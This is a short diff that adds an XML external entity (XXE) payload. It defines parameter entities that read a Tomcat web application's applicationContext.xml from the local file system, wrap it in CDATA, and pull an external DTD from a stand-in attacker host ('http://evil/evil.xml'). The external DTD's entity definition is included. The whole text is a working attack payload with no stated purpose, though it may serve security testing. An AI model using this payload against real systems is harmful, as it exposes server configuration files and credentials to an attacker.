@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+        <!ENTITY % start "<![CDATA[">
+ <!ENTITY % stuff SYSTEM "file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml ">
+<!ENTITY % end "]]>">
+                <!ENTITY % dtd SYSTEM "http://evil/evil.xml">
+        %dtd;
+        ]>
+<root>&all;</root>
+
+        ## External dtd: ##
+
+<!ENTITY all "%start;%stuff;%end;">
